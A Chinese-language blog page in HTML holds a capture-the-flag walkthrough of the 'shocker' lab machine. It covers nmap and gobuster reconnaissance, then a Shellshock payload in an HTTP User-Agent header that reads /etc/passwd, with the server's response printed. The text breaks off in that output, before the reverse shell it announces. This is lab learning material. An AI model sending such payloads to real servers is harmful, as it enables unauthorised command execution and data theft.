@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>shocker - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="shocker" />
+<meta property="og:description" content="1 GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/shocker/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-07T16:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-07T22:30:56+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="shocker"/>
+<meta name="twitter:description" content="1 GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/shocker/" /><link rel="prev" href="http://example.org/sosimple/" /><link rel="next" href="http://example.org/sense/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "shocker",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/shocker\/"
+        },"genre": "posts","wordcount":  1114 ,
+        "url": "http:\/\/example.org\/shocker\/","datePublished": "2023-12-07T16:08:29+08:00","dateModified": "2023-12-07T22:30:56+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">shocker</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-07">2023-12-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1114 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#heading"></a></li>
+        <li><a href="#该bash使用的环境变量是通过函数名称来调用的导致漏洞出问题是以开头定义的环境变量在命令env中解析成函数后bash执行并未退出而是继续解析并执行shell命令而其核心的原因在于在输入的过滤中没有严格限制边界也没有做出合法化的参数判断">该<code>Bash</code>使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>(){</code>开头定义的环境变量在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</a></li>
+        <li><a href="#将payload插入user-agentcookie等请求头中发送请求发现服务端已经将payload作为bash命令执行了下一步我想到的是反弹目标的shell到msf上">将payload插入user-agent，cookie等请求头中，发送请求，发现服务端已经将payload作为bash命令执行了。下一步，我想到的是反弹目标的shell到msf上。</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="heading"></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap -vv -sV -sT -A 10.129.85.4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT     STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl">2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> c4f8ade8f80477decf150d630a187e49 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 228fb197bf0f1708fc7e2c8fe9773a48 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e6ac27a3b5a9f1123c34a55d5beb3de9 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.93%E<span class="o">=</span>4%D<span class="o">=</span>5/1%OT<span class="o">=</span>80%CT<span class="o">=</span>1%CU<span class="o">=</span>31082%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>644F2A80
+</span></span><span class="line"><span class="cl">OS:%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS<span class="o">=</span>8<span class="o">)</span>SEQ<span class="o">(</span>
+</span></span><span class="line"><span class="cl">OS:SP<span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M53AST11NW6%O2<span class="o">=</span>M53AST11NW6%O3
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>M53ANNT11NW6%O4<span class="o">=</span>M53AST11NW6%O5<span class="o">=</span>M53AST11NW6%O6<span class="o">=</span>M53AST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>7120%W2<span class="o">=</span><span class="m">7</span>
+</span></span><span class="line"><span class="cl">OS:120%W3<span class="o">=</span>7120%W4<span class="o">=</span>7120%W5<span class="o">=</span>7120%W6<span class="o">=</span>7120<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>7210%O<span class="o">=</span>M53ANNSNW
+</span></span><span class="line"><span class="cl">OS:6%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RI
+</span></span><span class="line"><span class="cl">OS:PCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Uptime guess: 0.601 days <span class="o">(</span>since Sun Apr <span class="m">30</span> 20:31:11 2023<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="cl">TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">261</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对默认端口进行了扫描，开放了80，22端口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster dir -u http://10.129.85.4/ -w /usr/share/wordlists/dirb/small.txt
+</span></span><span class="line"><span class="cl">gobuster dir -u http://10.129.85.4/cgi-bin -w /usr/share/wordlists/dirb/small.txt -x sh,pl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="o">.</span><span class="mi">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="err">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="err">@</span><span class="n">firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>                     <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">85.4</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>                  <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">small</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.5</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Extensions</span><span class="p">:</span>              <span class="n">sh</span><span class="p">,</span><span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">01</span> <span class="mi">10</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">28</span> <span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">sh</span>              <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">118</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="p">:</span> <span class="mi">2877</span> <span class="o">/</span> <span class="mi">2880</span> <span class="p">(</span><span class="mf">99.90</span><span class="o">%</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">01</span> <span class="mi">10</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">21</span> <span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">                                                                     
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目录扫描的过程中发现存在/cgi-bin/目录，目录下有个user.sh，继续尝试看看是否存在shellshock漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /cgi-bin/user.sh HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host: 10.129.85.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User-Agent: () { :; }; echo; /bin/cat /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="p">:</span> <span class="n">Mon</span><span class="p">,</span> <span class="mi">01</span> <span class="n">May</span> <span class="mi">2023</span> <span class="mi">03</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">17</span> <span class="n">GMT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Server</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">18</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">1567</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
